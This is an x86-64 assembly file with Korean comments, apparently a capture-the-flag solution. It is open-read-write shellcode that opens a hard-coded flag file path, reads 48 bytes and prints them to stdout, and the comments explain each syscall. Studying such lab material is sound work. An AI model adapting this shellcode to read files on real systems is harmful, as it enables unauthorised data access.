;;Name: orw1.asm

section .text

global _start

_start:

mov rax,  0x676E6f6f6f6f6f6f ; oooooong
push rax
mov rax, 0x6C5F73695F656D61 ; ame_is_l
push rax
mov rax, 0x6E5F67616C662F63 ; c/flag_n
push rax
mov rax, 0x697361625f6c6c65 ; ell_basi
push rax
mov rax, 0x68732f656d6f682f ; /home/sh
push rax

mov rdi, rsp    ; rdi = "/home/shell_basic/flag_name_is_loooooong" 
								; rsp : 최상위 스택(가장 최근push된 값)
xor rsi, rsi    ; rsi = 0 ; RD_ONLY
xor rdx, rdx    ; rdx = 0
mov rax, 2      ; rax = 2 ; syscall_open
syscall         ; open("/home/shell_basic/flag_name_is_loooooong", RD_ONLY, NULL)
								; syscall의 반환값은 rax에 저장된다.

mov rdi, rax      ; rdi = fd  (첫번째 인자로 rax에 들어간 반환값을 사용해야 하므로 rax를 rdi에 대입.)
mov rsi, rsp      ; rsi는 파일에서 읽은 데이터를 저장할 주소를 의미.
sub rsi, 0x30     ; rsi = rsp-0x30 ; buf  0x30만큼 읽을 것이기 때문에 rsp - 0x30 을 대입.

mov rdx, 0x30     ; rdx = 0x30     ; len ; 읽어낼 데이터 길이 설정.
mov rax, 0x0      ; rax = 0        ; syscall_read
syscall           ; read(fd, buf, 0x30)


mov rdi, 1        ; rdi = 1 ; fd = stdout
mov rax, 0x1      ; rax = 1 ; syscall_write
syscall           ; write(fd, buf, 0x30)


; exiting the system -----
xor rdi, rdi
mov rax, 0x3C
syscall
